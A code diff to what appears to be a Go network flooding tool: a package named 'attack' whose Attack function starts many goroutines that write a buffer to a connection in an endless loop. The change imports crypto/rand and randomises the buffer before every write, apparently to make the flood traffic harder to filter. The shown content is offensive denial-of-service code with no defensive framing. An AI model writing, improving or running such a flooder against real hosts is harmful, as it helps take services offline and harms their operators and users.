@@ -3,6 +3,8 @@ package attack
 import (
 	"fmt"
 	"net"
+
+	"crypto/rand"
 )
 
 func Attack(addr string, threads uint64, size uint64) error {
@@ -19,6 +21,7 @@ func Attack(addr string, threads uint64, size uint64) error {
 	for i = 0; i < threads; i++ {
 		go func() {
 			for {
+				rand.Read(buff)
 				_, _ = conn.Write(buff)
 			}
 		}()
